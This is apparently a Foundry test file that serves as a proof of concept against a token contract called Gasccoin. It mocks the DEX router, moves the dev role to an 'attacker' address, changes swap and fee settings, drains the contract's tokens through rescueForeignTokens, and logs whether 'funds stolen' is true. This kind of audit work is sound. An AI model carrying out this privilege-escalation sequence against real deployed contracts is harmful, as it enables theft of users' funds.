// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Gasccoin.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address _to, uint256 _value) public {
        balanceOf[_to] += _value;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        return true;
    }
}

contract GasccoinPrivilegeTest is Test {
    Gasccoin token;
    MockToken mockToken;
    
    address owner = address(0x1);
    address initialDev = address(0x2);
    address attacker = address(0x4);
    
    function setUp() public {
        vm.mockCall(
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            abi.encodeWithSignature("factory()"),
            abi.encode(address(0x456))
        );
        vm.mockCall(
            0x10ED43C718714eb63d5aA57B78B54704E256024E,
            abi.encodeWithSignature("WETH()"),
            abi.encode(address(0x123))
        );
        vm.mockCall(
            address(0x456),
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(address(0x789))
        );

        vm.startPrank(owner);
        token = new Gasccoin();
        token.setNewDevAddress(payable(initialDev));
        mockToken = new MockToken();
        vm.stopPrank();

        // Fund Gasccoin contract with test tokens
        mockToken.mint(address(token), 1000 ether);
    }

    function testPrivilegeEscalation() public {
        // Pre-attack state queries
        console.log("========== PRE-ATTACK STATE ==========");
        bool initialSwapEnabled = token.swapEnabled();
        uint256 initialContractBalance = mockToken.balanceOf(address(token));
        uint256 initialAttackerBalance = mockToken.balanceOf(attacker);

        console.log("Initial swap status     :", initialSwapEnabled ? "ENABLED" : "DISABLED");
        console.log("Contract token balance  :", initialContractBalance);
        console.log("Attacker token balance  :", initialAttackerBalance);
        console.log("======================================\n");

        console.log("--- TRIGGERING ATTACK OPERATIONS ---");
        // Privilege escalation attack
        vm.prank(initialDev);
        token.setNewDevAddress(payable(attacker));

        vm.startPrank(attacker);
        token.toggleSwap(false);
        token.setFee(10, 10, 5, 5);
        token.rescueForeignTokens(address(mockToken), attacker, 1000 ether);
        vm.stopPrank();

        console.log("--- ATTACK OPERATIONS COMPLETED ---\n");

        // Post-attack state queries
        console.log("========= POST-ATTACK STATE =========");
        bool finalSwapEnabled = token.swapEnabled();
        uint256 finalContractBalance = mockToken.balanceOf(address(token));
        uint256 finalAttackerBalance = mockToken.balanceOf(attacker);

        console.log("Final swap status       :", finalSwapEnabled ? "ENABLED" : "DISABLED");
        console.log("Contract token balance  :", finalContractBalance);
        console.log("Attacker token balance  :", finalAttackerBalance);
        console.log("======================================\n");

        // Vulnerability verification
        console.log("======= VULNERABILITY ANALYSIS =======");
        bool swapStateChanged = (initialSwapEnabled != finalSwapEnabled);
        bool fundsStolen = (finalContractBalance == 0) && (finalAttackerBalance == initialAttackerBalance + 1000 ether);

        console.log("Swap configuration modified ?", swapStateChanged ? "YES" : "NO");
        console.log("Contract funds stolen       ?", fundsStolen ? "YES" : "NO");

        // Final determination
        if (swapStateChanged || fundsStolen) {
            console.log("\nVulnerability Exists: Attacker successfully executed privileged actions");
        } else {
            console.log("\nVulnerability not Exist: No significant state changes detected");
        }
    }
}